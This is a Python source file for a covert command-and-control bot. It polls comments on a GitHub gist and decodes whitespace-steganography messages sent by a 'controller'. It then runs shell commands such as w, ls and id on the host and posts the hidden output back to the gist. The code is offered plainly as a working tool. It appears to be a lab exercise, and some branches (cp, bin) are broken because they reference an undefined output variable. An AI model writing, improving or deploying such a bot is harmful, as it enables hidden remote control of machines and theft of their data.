from my_token import MY_TOKEN
import requests
import time
import subprocess
import pyUnicodeSteganography as STG

class Bot:
    def __init__(self, gist_id, token, url):
        self.gist_id = gist_id
        self.token = token
        self.url = url
        self.headers = {"Authorization": "Bearer " + self.token}
        self.num_messages = 0

    def encode_message(self, message, image_path=None):
        message = "bot: " + message
        enc_msg = STG.encode("This is normal message", message, method="snow")
        return enc_msg

    def decode_message(self, message):
        dec_msg = STG.decode(message, method="snow")
        return dec_msg

    def check_for_updates(self):
        response = requests.get(self.url, headers=self.headers)

        if response.status_code == 200:
            comments = response.json()
            num_new_messages = 0
            for j, comment in enumerate(comments):
                if j >= self.num_messages:
                    self.handle_message(comment['body'])
                    num_new_messages += 1
            self.num_messages += num_new_messages
        else:
            print(response.json()['message'])

    def handle_message(self, msg):
        msg = self.decode_message(msg)
        sender = msg.split()[0]
        msg = msg.split()[1:]
        if sender == "controller:":
            if msg[0] in ['w', 'ls', 'id', 'cp', 'bin']:
                self.handle_command(msg)
            else:
                print("unknown command")

    def handle_command(self, msg, path=None, file_name=None):
        command = msg[0]
        if command == 'w':
            # w (list of users currently logged in)
            output = subprocess.run(['w'], shell=True, stdout=subprocess.PIPE)
            self.post_message(str(output.stdout))

        if command == 'ls':
            # ls <PATH> (list content of specified directory)
            path = msg[1]
            output = subprocess.run(['ls', path], shell=True, stdout=subprocess.PIPE)
            self.post_message(str(output.stdout))

        if command == 'id':
            # id (if of current user)
            output = subprocess.run(['id'], shell=True, stdout=subprocess.PIPE)
            self.post_message(str(output.stdout))

        if command == 'cp':
            # Copy a file from the bot to the controller. The file name is specified
            file_name = 'file.txt'
            subprocess.run(['cp', file_name, '/path/to/destination'])
            self.post_message(str(output.stdout))

        if command == 'bin':
            # Execute a binary inside the bot given the name of the binary. Example: ‘/usr/bin/ps’
            binary_name = '/usr/bin/ps'
            subprocess.run([binary_name])
            self.post_message(str(output.stdout))

    def post_message(self, msg):
        msg = self.encode_message(msg)
        data = {"body": msg}
        response = requests.post(self.url, headers=self.headers, json=data)

        if response.status_code == 201:
            print("Comment posted successfully!")
        else:
            print("Failed to post comment. Status code: " + response.status_code)


if __name__ == "__main__":
    GIST_ID = "b13a8ec03c698d771a70ce34595621d6"
    url = f"https://api.github.com/gists/{GIST_ID}/comments"

    bot = Bot(GIST_ID, MY_TOKEN, url)
    while True:
        print("bot - checking for updates...")
        bot.check_for_updates()
        time.sleep(10)
    